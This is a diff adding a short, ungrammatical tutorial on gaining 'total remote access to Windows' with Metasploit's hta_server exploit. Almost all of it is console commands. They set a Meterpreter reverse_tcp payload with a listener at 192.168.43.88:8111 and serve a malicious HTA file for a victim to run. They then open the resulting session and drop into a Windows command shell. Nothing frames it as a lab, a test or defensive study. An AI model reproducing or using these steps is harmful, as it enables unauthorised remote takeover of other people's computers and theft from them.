@@ -1,0 +1,38 @@
+How make a attack for take total remote access to Windows, using a hta file. Using metasploit.
+
+
+$ msfconsole
+
+
+msf6 > use exploit/windows/misc/hta_server
+
+Set the local host and server host to use
+msf6 exploit(exploit/windows/misc/hta_server) > set lhost 192.168.43.88
+msf6 exploit(exploit/windows/misc/hta_server) > set srvhost 192.168.43.88
+
+Set the payload for reverse shell
+msf6 exploit(exploit/windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
+
+Set the port to listen
+msf6 exploit(exploit/windows/misc/hta_server) > set lport 8111
+
+Verify the configuration
+msf6 exploit(exploit/windows/misc/hta_server) > show options
+
+Running
+msf6 exploit(exploit/windows/misc/hta_server) > exploit
+
+Now a direction is generated from a server with the hta file to execute in Windows.
+
+------------
+
+When the file is executed a session is open
+
+List of sessions
+msf6 exploit(exploit/windows/misc/hta_server) > sessions
+
+Connect to the session
+msf6 exploit(exploit/windows/misc/hta_server) > sessions -i 1
+
+Now your is in the Windows machine, execute 'help' for more info or 'shell' for 
+get the cmd of Windows.
